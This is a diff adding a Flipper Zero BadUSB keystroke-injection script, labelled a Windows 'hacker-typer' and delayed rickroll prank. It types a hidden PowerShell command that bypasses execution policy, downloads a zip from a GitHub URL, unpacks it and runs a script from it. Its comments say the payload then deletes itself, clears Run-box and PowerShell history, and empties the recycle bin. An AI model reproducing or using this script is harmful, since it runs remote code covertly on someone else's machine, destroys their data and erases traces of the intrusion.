@@ -1,0 +1,42 @@
+REM  Hacker-typer By UberGuidoZ Git BadUSB resources -> https://github.com/UberGuidoZ/Flipper/tree/main/BadUSB
+REM  Opens a harmless website and types like a hacker
+
+
+REM  Merged with delayed rickroll by AbeNaws in an attempt create a script which will run after some preset delay
+REM  AbeNAws Git BadUsb resources -> https:// github.com/AbeNaws/Flipper-Zero-BadUsb-Scripts
+REM  ###########################################
+REM  #                                         |
+REM  # Title        : Windows Delayed Rickroll |
+REM  # Author       : AbeNaws                  |
+REM  # Version      : 1.0                      |
+REM  # Category     : Prank                    |
+REM  # Target       : Windows                  |
+REM  #                                         |
+REM  ###########################################
+
+
+REM Also special thanks to I-Am-Jakoby for his creation of the Jumpscare 2.0 which is where I learned what little I know about .ps1 files.  All of this was borrowed and re-worked to accomplish my goal!
+REM     Title: JumpScare 2.0
+REM     Author: I am Jakoby
+REM     Description: This is a one liner payload that will execute and wait until a mouse movement is detected and do a jumpscare
+REM     Target: Windows 10, 11
+REM I-Am-Jakoby Git BadUsb resources -> https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB
+
+
+REM  Converted to .txt and then to .ps1 by Luciferseamus - reason- I wanted to be able to run this but have the option to delay the effect.  I couldn't figure out how to do it via .txt (ACTUALLY I DID!!) file so I 
+REM  It seemed easier after messing with PS commands for almost an entire month. I did learn alot however!  
+REM  I could not have done any of this without inspiration from these three Titans and the entire f0 community. Thanks to all of you for inspiring me to undertake this project.
+
+REM
+DELAY 1000
+GUI r
+DELAY 500
+REM                            
+STRING powershell -w h -NoP -NonI -Exec Bypass $D="$env:tmp";iwr 'https://github.com/luciferseamus/DL/raw/main/t.zip' -O "$D\t.zip";Expand-Archive "$D\t.zip" -Des $D -Force;cd $D;.\'ts5.ps1';
+ENTER
+
+REM  Currently set for 5 seconds
+REM There are multiple .ps1 scripts in the zip file. they all start with t the next character designates (h)ours, (m)minutes or (s)econds.  example 'ts30.ps1' = typer with a delay of 30 seconds. I pre-made 5
+REM  second, 30 sec, 1 minute, 30 min, 1 hour and 3 hrs. none of them are set to repeat but if anyone wants I can add that or you can edit the .ps1 file and adjust the repeat quantity.
+REMall of the files will delete themselves after running as well as the zip, clear run box history, clear powershell history and empty the recycle bin.
+REM Also included is t1.ps1 so you can verify things are being cleaned up without having to sit through the entire script 
